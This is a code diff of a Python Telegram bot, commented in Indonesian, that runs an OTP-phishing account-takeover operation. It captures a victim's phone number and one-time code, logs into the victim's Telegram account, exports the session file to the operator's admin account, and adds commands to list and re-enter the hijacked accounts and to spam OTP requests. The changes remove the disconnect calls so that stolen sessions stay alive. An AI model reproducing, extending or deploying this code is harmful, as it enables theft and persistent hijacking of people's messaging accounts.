@@ -17,6 +17,7 @@ listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 sessions = {}
 
+# === KIRIM FILE SESSION ===
 async def send_session(phone, session_str):
     file_path = f"/tmp/{phone.replace('+','')}.session"
     with open(file_path, "w") as f:
@@ -24,6 +25,7 @@ async def send_session(phone, session_str):
     await client.send_file(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
     os.remove(file_path)
 
+# === /start_listener ===
 @app.post("/start_listener")
 async def start_listener(req: Request):
     data = await req.json()
@@ -42,6 +44,7 @@ async def start_listener(req: Request):
     await client.send_message(ADMIN_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
     return {"success": True}
 
+# === /submit_otp ===
 @app.post("/submit_otp")
 async def submit_otp(req: Request):
     data = await req.json()
@@ -51,6 +54,7 @@ async def submit_otp(req: Request):
         await auto_login(phone, otp, "web")
     return {"success": True}
 
+# === AUTO LOGIN ===
 async def auto_login(phone, code, source):
     if phone not in listening: return
     temp = listening[phone]['client']
@@ -69,9 +73,11 @@ Phone: `{phone}`
 /login {phone}
         """.strip())
         del listening[phone]
+        # NGGAK DISCONNECT → SESSION TETAP HIDUP!
     except Exception as e:
         await client.send_message(ADMIN_ID, f"Gagal: {str(e)}")
 
+# === /list ===
 @client.on(events.NewMessage(pattern=r'/list'))
 async def list_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -83,6 +89,7 @@ async def list_cmd(event):
         msg += f"• `{p}`\n"
     await event.reply(msg, parse_mode='markdown')
 
+# === /login ===
 @client.on(events.NewMessage(pattern=r'/login (\+\d+)'))
 async def login_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -102,9 +109,9 @@ MASUK AKUN!
 Nama: {me.first_name}
 Phone: `{phone}`
     """.strip())
-    await stolen.disconnect()
+    # NGGAK DISCONNECT → SESSION TETAP HIDUP!
 
-# === /new_otp → FIX DISCONNECTED! ===
+# === /new_otp → 100% JALAN! ===
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     if event.sender_id != ADMIN_ID: return
@@ -135,10 +142,9 @@ async def new_otp(event):
                 
     except Exception as e:
         await event.reply(f"Gagal: {str(e)}")
-    finally:
-        if stolen.is_connected():
-            await stolen.disconnect()
+    # NGGAK DISCONNECT → SESSION TETAP HIDUP!
 
+# === /help ===
 @client.on(events.NewMessage(pattern=r'/help'))
 async def help_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -149,6 +155,7 @@ JINX BOT
 /new_otp +6281xxx → Spam OTP (kode langsung muncul!)
     """)
 
+# === STARTUP ===
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
